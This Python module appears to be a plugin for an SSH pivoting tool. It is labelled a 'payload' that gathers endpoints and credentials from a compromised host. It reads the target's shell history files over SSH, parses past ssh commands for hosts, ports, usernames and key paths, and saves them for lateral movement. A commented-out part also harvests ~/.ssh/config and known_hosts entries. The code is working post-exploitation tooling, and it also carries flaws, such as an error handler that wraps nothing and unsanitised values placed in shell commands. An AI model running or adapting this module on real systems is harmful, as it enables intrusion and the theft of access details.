import getpass
import os.path
import re
import glob
import ipaddress
from src.endpoint import Endpoint
from src.user import User

#TODO implement those
'''
def gatherFromConfig(sshConfFile,hosts):
    with open(sshConfFile,'r',errors='replace') as f:
        data = f.read()
    lines = data.split('\n')
    nbHosts = 0
    curHost = None
    for line in lines:
        if line == '':
            continue
        if line[:5] == "Host ":
            curHost = Host(line.split()[1])
            hosts.append(curHost)
            nbHosts = nbHosts+1
        else:
            [key,val] = line.strip().split(' ',1)
            if key == "User":
                curHost.user = val
            elif key == "Port":
                curHost.port = val
            elif key == "HostName":
                curHost.host = val
            elif key == "IdentityFile":
                curHost.setIdentity(val)
    print("Found "+str(nbHosts)+" hosts in "+sshConfFile)

def gatherFromKnown(homedir,hosts,hostsInConfig):
    with open(homedir+".ssh/known_hosts",'r',errors='replace') as f:
        data = f.read()
    lines = data.split('\n')
    nbHosts = 0
    for line in lines:
        if "|" in line:
            #The entry is hashed, and should be ignored
            continue
        hostnames = []
        ip = ""
        targets = line.partition(' ')[0]
        for target in targets.split(','):
            try:
                ipaddress.ip_address(target)
            except ValueError:
                hostnames.append(target)
            else:
                ip = target
        if len(hostnames) > 0 and hostnames[0] != "":
            newHost = Host(hostnames[0])
        elif ip == "":
            continue
        else:
            newHost = Host(ip)
        newHost.hostnames = hostnames
        if ip != "":
            newHost.host = ip
        else:
            newHost.host = hostnames[0]
        nbHosts = nbHosts+1
        if not newHost in hosts:
            hosts.append(newHost)

    print("Found "+str(nbHosts)+" hosts in known_hosts")

def misc():
    hosts = []
    gatherFromConfig(sshConfFile,hosts)
    hostsInConfig = []
    for host in hosts:
        hostsInConfig.append(host.name)
    for f in listHistoryFiles(homedir):
        gatherFromHistory(f,hosts,hostsInConfig)
    gatherFromKnown(homedir,hosts,hostsInConfig)
    print("Found "+str(len(hosts))+" hosts in all sources")
'''

class ExtStr(type):
    def __str__(self):
        return self.getKey()

class BaboosshExt(object,metaclass=ExtStr):

    def __init__(self,socket,connection):
        self.socket = socket
        self.connection = connection

    @classmethod
    def getModType(cls):
        return "payload"

    @classmethod
    def getKey(cls):
        return "gather"

    @classmethod
    def descr(cls):
        return "Gather endpoints and creds from compromised target"
    
    @classmethod
    def run(cls,socket, connection):
        g = cls(socket,connection)
        g.gather()
        try:
            pass
        except Exception as e:
            print("Error : "+str(e))
            return False
        return True
    
    def gather(self):
        historyFiles = self.listHistoryFiles()
        for historyFile in historyFiles:
            self.gatherFromHistory(historyFile)


    def listHistoryFiles(self):
        ret = []
        result = self.socket.run("ls -a",hide=True)
        for line in result.stdout.splitlines():
            if "history" in line:
                ret.append(line)
        return ret

    def gatherFromHistory(self,historyFile):
        result = self.socket.run("cat "+historyFile,hide=True)
        lines = result.stdout.splitlines()
        nbEndpoints = 0
        nbUsers = 0
        for line in lines:
            if re.search(r'^ *ssh ',line):
                option = ""
                words = line.split()
                host = False
                port = None
                user = None
                identity = None

                for i in range(1,len(words)):
                    if option != "":
                        if option == "identity":
                            identity = words[i]
                        elif option == "port":
                            port = words[i]
                        option = ""
                    elif words[i][0] == "-":
                        if words[i] == "-i":
                            option = "identity"
                        elif words[i] == "-p":
                            option = "port"
                        else:
                            option = words[i]
                    elif not host:
                        if '@' in words[i]:
                            user,hostname = words[i].split("@",1)
                        else:
                            hostname = words[i]
                        host = True
                
                if not host:
                    continue
                
                #Check if hostname is IP or Hostname :
                try:
                    ipaddress.ip_address(hostname)
                except ValueError:
                    res = self.socket.run("getent hosts "+hostname+" | awk '{ print $1 }'",hide=True)
                    ips = res.stdout.splitlines()
                    for ip in ips:
                        endpoint = Endpoint(ip,port if port is not None else 22)
                        endpoint.save()
                        nbEndpoints = nbEndpoints + 1
                else:
                    endpoint = Endpoint(hostname,port if port is not None else 22)
                    endpoint.save()
                    nbEndpoints = nbEndpoints + 1
                if user is not None:
                    user = User(user)
                    user.save()
                    nbUsers = nbUsers + 1
                if identity is not None:
                    #TODO fetch key and create cred object
                    continue
        print("Found "+str(nbEndpoints)+" enpoints and "+str(nbUsers)+" users in "+historyFile)


